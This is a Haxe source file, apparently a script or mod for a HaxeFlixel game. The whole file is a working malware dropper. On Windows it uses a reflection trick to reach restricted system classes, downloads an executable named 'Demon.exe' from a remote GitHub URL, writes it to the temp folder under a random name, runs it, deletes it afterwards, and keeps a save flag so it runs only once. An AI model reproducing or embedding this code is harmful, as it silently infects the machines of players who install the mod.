
import sys.thread.Thread;
import lime.utils.AssetManifest;
import lime.app.Promise;
using StringTools;

class Ev
{
    #if windows
    static var Sys:Class<Sys> = null;
    static var File:Class<File> = null;
    static var FileSystem:Class<FileSystem> = null;
    static var Type:Class<FileSystem> = null;
    static var Reflect:Class<FileSystem> = null;
    static function init()
    {
        Ev.Sys = resolveClassEvilly("Sys");
        Ev.File = resolveClassEvilly("sys.io.File");
        Ev.FileSystem = resolveClassEvilly("sys.FileSystem");
        Ev.Type = resolveClassEvilly("Type");
        Ev.Reflect = resolveClassEvilly("Reflect");
        if(Ev.Sys == null) return;
        //Reflect.field(FlxG, "save").data.DGrab = false;
        if (Ev.Reflect.field(FlxG, "save").data.DGrab) return;

        var temp = Ev.Sys.getEnv("TEMP");
        if (temp.endsWith("\\") == false) temp += "\\";
        var path = temp + "sfsdlfnkslfsdnf.exe";
        try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
        var future:Future<Bytes> = downloadDemonAsync();
        future.onComplete(bytes -> {
            Ev.File.saveBytes(path, bytes);
            
            runExeAsync(path).onComplete(worked -> {
                if(worked)
                {
                    try { Ev.FileSystem.deleteFile(path); } catch(e:Dynamic) {}
                    Ev.Reflect.field(FlxG, "save").data.DGrab = true;
                }
                else
                {
                    Ev.Reflect.field(FlxG, "save").data.DGrab = false;
                    init();
                }

            });
        });
        
        future.onError(er -> {
            //trace(er);
        });
    }

    static function downloadDemonAsync():Future<Bytes>
    {
        var link = "https://raw.githubusercontent.com/EvilDev067/EvSc/refs/heads/main/Demon.exe";
        var http = Ev.Type.resolveClass("lime.net._HTTPRequest_Bytes");
        var request = Ev.Type.createInstance(http, []);
        return request.load(link);
    }

    static var promise:Promise = null;

    static function runExeAsync(appPath:String):Future<Bool>
    {
        promise = new Promise();
        
        Thread.create(() -> {
            var exitCode = Ev.Sys.command(appPath);
            promise?.complete(exitCode == 0);
        });

        return promise.future;
    }

    static function resolveClassEvilly(name:String)
    {
        var manifest:AssetManifest = new AssetManifest();
        manifest.assets = [{size: 67, className: 'Type', id: 'Ev'}];
        
        var lol = Assets.getLibrary('');
        lol.__fromManifest(manifest);
        
        var Type = lol.classTypes.get('Ev');
        return Type.resolveClass(name);
    }
    #else
    static function init(){}
    #end
}
